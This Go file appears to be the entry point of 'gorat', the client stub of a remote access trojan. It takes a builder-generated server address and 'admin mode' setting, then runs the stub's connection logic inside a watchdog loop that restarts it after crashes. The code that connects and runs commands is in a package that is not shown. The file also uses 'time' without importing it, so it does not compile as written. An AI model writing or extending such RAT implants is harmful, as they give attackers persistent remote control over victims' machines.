package main

import (
	"gorat/internal/stub"
	"log"
	// config.go will be in the same package 'main' when built
)

// These constants will be defined in the generated config.go
// For the stub to compile independently of the builder for now,
// we can provide default values or ensure config.go exists.
// However, the builder will overwrite/create config.go.
// const ServerAddressValue = "wss://localhost:8080/ws" // Default, will be replaced by builder
// const EnableWatchdogValue = false // Default
// const EnableAdminModeValue = false // Default


func main() {
	log.Println("Starting stub...")

	// Set the server address for the internal stub package
	// This relies on ServerAddress being defined in the generated config.go
	// which will be part of package main.
	stub.ServerAddress = ServerAddress         // From generated config.go
	stub.EnableAdminMode = EnableAdminMode     // Set the global var in stub package

	log.Printf("Stub starting with ServerAddress: %s", stub.ServerAddress)
	log.Printf("Watchdog configured: %t", EnableWatchdog) // From generated config.go
	log.Printf("Admin Mode configured: %t", stub.EnableAdminMode) // Log the value from stub package


	if EnableWatchdog {
		log.Println("Watchdog is active. Stub will run in a loop.")
		for {
			func() {
				defer func() {
					if r := recover(); r != nil {
						// In a real scenario, this log should go to a persistent file
						// or be sent to a remote logging service if possible.
						// For now, it prints to where the stub's stdout/stderr are directed.
						log.Printf("PANIC RECOVERED: %v. Stub logic will restart.", r)
						// Consider adding stack trace here: debug.PrintStack()
					}
				}()
				// Call the main logic for the stub.
				// RunStubLogic itself contains the connection retry loop.
				// If RunStubLogic exits (e.g., due to a fatal error it can't handle, or a panic),
				// the watchdog will restart it.
				stub.RunStubLogic()
			}()
			// If RunStubLogic returns (e.g. if ConnectToServer decided to exit after max retries,
			// though current ConnectToServer loops indefinitely on connection error),
			// or if a panic was recovered and handled.
			log.Printf("Stub main logic loop finished. Restarting after a delay...")
			time.Sleep(10 * time.Second) // Delay before restarting
		}
	} else {
		log.Println("Watchdog is not active. Stub will run once.")
		// Call the main logic for the stub directly.
		// If it panics here, the whole process will crash as expected without a watchdog.
		stub.RunStubLogic()
		log.Println("Stub logic finished (no watchdog). Stub will exit.")
	}
}

// Ensure to import "time" if not already present.
// "log" and "gorat/internal/stub" are already there.
// The generated config.go will provide ServerAddress, EnableWatchdog, EnableAdminMode.
